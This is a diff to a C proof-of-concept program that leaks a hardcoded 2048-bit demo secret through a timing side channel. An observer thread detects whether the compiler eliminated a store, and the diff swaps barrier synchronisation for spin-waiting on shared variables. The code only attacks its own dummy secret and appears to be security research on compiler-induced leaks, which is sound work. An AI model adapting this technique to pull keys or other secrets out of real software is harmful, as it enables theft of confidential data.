@@ -2,7 +2,6 @@
 #include <stdint.h>
 #include <stdbool.h>
 #include <pthread.h>
-#include "pthread_barrier.h"  // from darwinpthreadbarrier; necessary because pthreads on Mac doesn't implement barrier
 #include <unistd.h>  // nanosleep()
 #include <stdlib.h>  // exit()
 #include <math.h>
@@ -13,20 +12,19 @@
 // 2048-bit secret is 32 uint64_t's
 static const uint64_t SECRET[32] = {
   0xf07b23a5461d8c9e, 0x198ab650cd723fe4, 0x2f567e10d4a89cb3, 0x9999999999999999,
-  0xe67b23a54f1d8c90, 0x198cd650ab723ef4, 0x10567ef2d4a89cb3, 0x7777777777777777,
-  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d7a89cb3, 0x9898989898989898,
-  0xe76b23a5f41dc890, 0x098cd651ab723ef4, 0x10567efd24a89cb3, 0x7007007007007007,
+  0xe67b23a54f1d8c90, 0x198cd650ab723ef4, 0x10567ef2d4a89cb3, 0x6a6a6a6a6a6a6a6a,
+  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d7a89cb3, 0x9393939393939393,
+  0xe76b23a5f41dc890, 0x098cd651ab723ef4, 0x10567efd24a89cb3, 0x7887788778877887,
   0xf07b23a5461c8d9e, 0x189ab650cd237fe4, 0x2f567e10d4a89cb3, 0x9999999999999999,
-  0xe67b23a54f1d8c09, 0x198cd6a05b723ef4, 0x10567ef2d4a89cb3, 0x7777777777777777,
-  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d78a9cb3, 0x9098909898989098,
-  0xe76b23a5fcd41890, 0x098cd65ab1723ef4, 0x10567def24a89cb3, 0x7107107107107107,
+  0xe67b23a54f1d8c09, 0x198cd6a05b723ef4, 0x10567ef2d4a89cb3, 0x3333333333333333,
+  0xf08b23a5461d7c9e, 0x891ab650cd723fe4, 0x2f465e10d78a9cb3, 0x9595959595959595,
+  0xe76b23a5fcd41890, 0x098cd65ab1723ef4, 0x10567def24a89cb3, 0xacacacacacacacac,
 };
 
 static volatile bool alwaysFalse = false;
 static volatile bool observer_exit = false;
-static pthread_barrier_t barrier;
 static unsigned x;
-static unsigned char a[2048];
+static unsigned r;
 
 // attack function for gcc (i.e. not clang/llvm)
 #if !defined(__clang__) && !defined(__llvm__)
@@ -47,10 +45,10 @@ static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t iters) { \
   /* waste some time, but don't use a syscall like usleep().                 */ \
   /* If we use a syscall, gcc wants to do the x=1 store first, regardless.   */ \
   volatile int v = 0; \
-  volatile unsigned char* a_vol = &a[bitnum];  /* volatile so we keep reloading */ \
+  volatile unsigned *r_vol = &r;  /* volatile so we keep reloading */ \
   do { \
     v++; \
-    if(*a_vol > 0) break; /* quit early if observer has already gotten something */ \
+    if(*r_vol > 0) break; /* quit early if observer has already gotten something */ \
   } while(--iters > 0); \
  \
   if(alwaysFalse) { \
@@ -100,41 +98,42 @@ FOR_0_TO_2047(DECLARE_ATTACKFUNC)
 // array storing pointers to all 2048 attackfuncs
 void (*attackfunc_array[2048])(uint64_t);
 
+static void set_x_and_wait_for_r(int value) {
+  // Volatile aliases so reads and writes actually happen
+  volatile unsigned* x_vol = &x;
+  volatile unsigned* r_vol = &r;
+  *x_vol = value;
+  while(*r_vol != value);
+}
+
 // bitnum: which bit of the secret to leak
 // iters: a tuning parameter passed on to attackfunc()
 // returns the guessed value of the bit
 static bool leakSingleBit(unsigned bitnum, uint64_t iters) {
-  x = 0;
-
-  pthread_barrier_wait(&barrier);  // tell observer to start
+  // ensure we properly wait for observer's result than than possibly reading last time's result
+  set_x_and_wait_for_r(1);
+  set_x_and_wait_for_r(0);
 
   attackfunc_array[bitnum](iters);
 
   // use a volatile pointer so that it keeps reloading for real
-  volatile unsigned char* result = &a[bitnum];
+  volatile unsigned *r_vol = &r;
   unsigned char retval;
-  do { retval = *result; } while(retval == 0);  // wait until result is nonzero
+  do { retval = *r_vol; } while(retval == 0);  // wait until r is nonzero
 
   return retval == 2;  // if we observe x==2, then the x=1 store
                        // was (probably) eliminated; see notes on attackfunc()
 }
 
 static void* observer(void* dummy) {
-  // use a volatile pointer so that it keeps reloading for real
+  // use volatile pointers so that reads/writes actually happen
   // but we don't want x itself to be volatile, because then DSE isn't allowed
   volatile unsigned* x_vol = &x;
-
-  unsigned index = 0;
+  volatile unsigned* r_vol = &r;
 
   // loop until main thread tells us to exit
   while(!observer_exit) {
-    pthread_barrier_wait(&barrier);
-
-    // wait until we observe either x==1 or x==2
-    do { a[index] = *x_vol; } while(a[index] == 0);
-
-    index++;  // having recorded one slot of a, move to the next slot
-    if(index >= 2048) index = 0;
+   *r_vol = *x_vol;
   }
   return 0;
 }
@@ -151,8 +150,6 @@ static uint64_t* leak2048bitSecret(uint64_t iters, unsigned error_runs) {
   memset(finalLeakedSecret, 0xff, 32*sizeof(uint64_t));
 
   do {
-    memset(a, 0, 2048*sizeof(unsigned char));  // this ensures that leakSingleBit properly waits for observer's result
-                                               // rather than possibly reading last time's result
     for(unsigned which_64t = 0; which_64t < 32; which_64t++) {
       uint64_t leakedSecret = 0;  // just the 64 bits we're operating on right now
       for(unsigned bitnum = 0; bitnum < 64; bitnum++) {
@@ -287,7 +284,6 @@ int main(int argc, char* argv[]) {
   FOR_0_TO_2047(INITIALIZE_ATTACKFUNC)
 
   // Fire up the observer thread
-  pthread_barrier_init(&barrier, NULL, 2);
   pthread_t thread;
   pthread_create(&thread, NULL, &observer, NULL);
 
